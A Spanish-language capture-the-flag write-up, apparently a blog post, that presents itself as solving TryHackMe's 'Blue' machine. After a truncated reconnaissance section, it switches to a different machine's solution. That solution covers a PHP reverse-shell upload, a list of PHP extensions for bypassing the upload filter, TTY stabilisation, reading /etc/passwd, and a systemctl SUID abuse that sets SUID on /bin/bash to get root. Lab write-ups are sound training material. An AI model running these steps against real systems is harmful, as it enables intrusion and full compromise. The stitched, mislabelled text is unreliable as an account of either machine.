I"F<p>En esta ocasión vamos a resolver la máquina <em>Blue</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá <code class="language-plaintext highlighter-rouge">EternalBlue</code>?</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Blue-TryHackMe/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n &lt;dirección IP&gt; -oG allPorts
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; -oG allPorts
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido  “, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que <em>valor</em> por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
  <li>oG - Exportar el escaneo en formato “<em>grepeable</em>”</li>
</ul>

<p>Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -p PUERTOS &lt;dirección IP&gt; -oN targeted
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
  <li>oN - Exportar el escaneo en formato <em>Nmap</em></li>
</ul>

<p>Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:</p>

<ul>
  <li>¿Cuántos puertos están abiertos con un número de puerto inferior a 1000?</li>
  <li>¿A qué es vulnerable esta máquina?</li>
</ul>

<p>Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con <em>Nmap</em>. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responde a la segunda pregunta, tendremos que introducir a</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; podemos descargar una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">aquí</a>. Una vez la hayamos descargado, tenemos que modificar el valor de la <code class="language-plaintext highlighter-rouge">ip</code> (colocamos la nuestra), y si queremos, podemos también modificar el valor del <em>puerto</em>, aunque esto es completamente opcional.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/5.png" alt="" /></p>

<p>Sin embargo, cuando intentamos subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/6.png" alt="" /></p>

<p>Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizaramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar <code class="language-plaintext highlighter-rouge">Burp Suite</code> para poder realizar una ataque de tipo <code class="language-plaintext highlighter-rouge">Sniper</code>.</p>

<p>Para ello, vamos a empezar por volver a subir nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code>, pero ahora tramitando todas las peticiones a través de <code class="language-plaintext highlighter-rouge">Burp Suite</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/7.png" alt="" /></p>

<p>Posterior a ello presionaremos <code class="language-plaintext highlighter-rouge">Ctrl + I</code> para enviar esta petición al <code class="language-plaintext highlighter-rouge">Intruder</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/8.png" alt="" /></p>

<p>Ahora, en el apartado <em>Positions</em>, en el tipo de ataque elegiremos la opción de <code class="language-plaintext highlighter-rouge">Sniper</code>, después seleccionaremos la opción <code class="language-plaintext highlighter-rouge">Clear §</code>, para posteriormente con nuestro cursor <code class="language-plaintext highlighter-rouge">resaltar</code> la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción <code class="language-plaintext highlighter-rouge">Add §</code>; esto se vería algo así:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/9.png" alt="" /></p>

<p>Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de <em>PHP</em>:</p>

<ul>
  <li>.php</li>
  <li>.phtml</li>
  <li>.php3</li>
  <li>.php4</li>
  <li>.php5</li>
  <li>.php7</li>
  <li>.phps</li>
  <li>.php-s</li>
  <li>.pht</li>
  <li>.phar</li>
</ul>

<p>Una vez, hemos creado nuestro diccionario, en el apartado <em>Payloads</em>, en la opción <em>Sample List</em> cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/10.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/11.png" alt="" /></p>

<p>Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado <code class="language-plaintext highlighter-rouge">200</code>, la <em>longitud</em> de estas no es la misma para para todas las extensiones, la única extensión cuya <em>longitud</em> varía es <code class="language-plaintext highlighter-rouge">.phtml</code>; si quisieramos estar completamente seguros, podríamos revisar el <code class="language-plaintext highlighter-rouge">render</code> de la respuesta, el cual nos devuelve un <code class="language-plaintext highlighter-rouge">success</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/12.png" alt="" /></p>

<p>Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta <code class="language-plaintext highlighter-rouge">internal</code>, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.</p>

<p>Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de <code class="language-plaintext highlighter-rouge">Netcat</code>. A partir de aquí podemos hacer dos cosas:</p>

<p>Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de <em>TryHackMe</em>), es decir, entrar a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>
<p>O por otra parte, y sin dejar la consola, utilizar el comando <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;dirección IP&gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
</code></pre></div></div>

<p>Ambas opciones, nos conseguirán una <em>consola</em> dentro de la máquina víctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/13.png" alt="" /></p>

<p>Es importante aclarar que la <em>consola</em> que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la <em>consola</em> utilizando <code class="language-plaintext highlighter-rouge">Ctrl + L</code>, no pasará nada, así mismo si quisieramos desplazarnos utilizando las <code class="language-plaintext highlighter-rouge">flechas</code> del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la <code class="language-plaintext highlighter-rouge">TTY</code>, para lo cual haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
reset
xterm

export TERM=xterm
export SHELL=bash

stty rows &lt;valor&gt; columns &lt;valor&gt;
</code></pre></div></div>

<p>Los valores que colocaremos en <code class="language-plaintext highlighter-rouge">&lt;valor&gt;</code> en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty -a
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/14.png" alt="" /></p>

<p>Continuando con las preguntas de la plataforma, se nos pide averigurar por el usuario que maneja el servidor web, así como su respectiva <code class="language-plaintext highlighter-rouge">flag</code>. Para realizar esto podríamos dirigirnos al directorio <code class="language-plaintext highlighter-rouge">/home</code>, y listar los directorios que existen.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/15.png" alt="" /></p>

<p>Aunque también podriamos filtrar del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, a través de expresiones regulares, todos aquellos usuario que tengan una <em>shell</em>, sea esta una:</p>

<ul>
  <li>bash</li>
  <li>csh</li>
  <li>ksh</li>
  <li>sh</li>
  <li>tcsh</li>
  <li>zsh</li>
</ul>

<p>Esto sería bastante fácil, ya que todas, o casi todas las <em>shells</em> terminan en <code class="language-plaintext highlighter-rouge">sh</code>, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd | grep "sh$"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/16.png" alt="" /></p>

<p>Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la <code class="language-plaintext highlighter-rouge">flag</code> del usuario con bajos privilegios, para ello podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name user.txt 2&gt; /dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/17.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>Para realizar esta última fase, la misma plataforma de <em>TryHackMe</em> nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p>

<p>Para listar todos aquellos binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/18.png" alt="" /></p>

<p>La mejor forma para abusar de algún binario, es recurrir a <a href="https://gtfobins.github.io/">GTFOBins</a>, esta página nos enseña como explotar binarios con <em>capabilities</em> mal asignadas, binarios que se pueden ejectuar como <em>root</em>, y en este caso, binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code> mal asignados.</p>

<p>El binario más extraño que nos encontramos es <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/19.png" alt="" /></p>

<p>Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos</p>

<p>Para conseguir la última <code class="language-plaintext highlighter-rouge">flag</code> haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' &gt; $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
</code></pre></div></div>

<p>Si nos percatamos, lo único que modificamos de la información que nos provee <code class="language-plaintext highlighter-rouge">GTFOBins</code>, fue el código a ejecutar, en este caso, estamos asignando un permiso <code class="language-plaintext highlighter-rouge">SUID</code> a la <code class="language-plaintext highlighter-rouge">/bin/bash</code>, para posteriormente, a través del parámetro <code class="language-plaintext highlighter-rouge">-p</code>, ejecutar el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario <em>root</em>. Otro aspecto que se modificó, fue utilizar el binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> desde su ruta absoluta, mas no de su ruta relativa.</p>

<p>Una vez hemos abusado del binario <code class="language-plaintext highlighter-rouge">/bin/systemctl</code>, haremos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -p
</code></pre></div></div>

<p>Una vez siendo <em>root</em>, podemos pasar a buscar su respectiva <code class="language-plaintext highlighter-rouge">flag</code>, esto lo podemos hacer así:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find . -name root.txt
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/20.png" alt="" /></p>
:ET